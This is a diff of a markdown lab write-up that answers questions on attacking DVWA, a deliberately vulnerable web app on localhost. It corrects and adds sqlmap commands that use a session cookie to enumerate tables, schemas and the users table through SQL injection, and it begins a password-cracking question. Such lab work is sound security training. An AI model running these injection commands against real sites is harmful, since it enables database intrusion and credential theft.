@@ -146,24 +146,36 @@ python exploit.py | ./vuln
 ## 1. Identify the vulnerable URL: 
 *Let proceed to the cookies when entering ID = 2* 
 
+![image](https://github.com/user-attachments/assets/ef903365-d7e6-419e-9d59-59052b30ef77)
+
 ```sh
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" -- cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7"    
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7"    
 ```
 ![image](https://github.com/user-attachments/assets/42916b8d-1481-4c4a-a85b-92322cb1efc4)
 
-*Revealing the database schemas*:
+*Revealing the DVWA tables:*
+```sh
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7"  -D dvwa --tables 
+```
+![image](https://github.com/user-attachments/assets/0a43a875-621d-4dd9-bf8a-12ede9fa3cf2)
+
+
+*Revealing the database schemas:*
 
 ```sh
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" -- cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --schema --batch
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --schema --batch
 ```
+![image](https://github.com/user-attachments/assets/ea59799d-ff40-45ed-be1a-a9a845666ea4)
 
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 *To observe the users information within DVWA, we can use:* <br> 
 ```sh
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" -- cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --columns -T users --batch  
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --columns -T users --batch  
 ```
+![image](https://github.com/user-attachments/assets/946a78a8-58b5-48a0-a967-63884a581622)
+
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
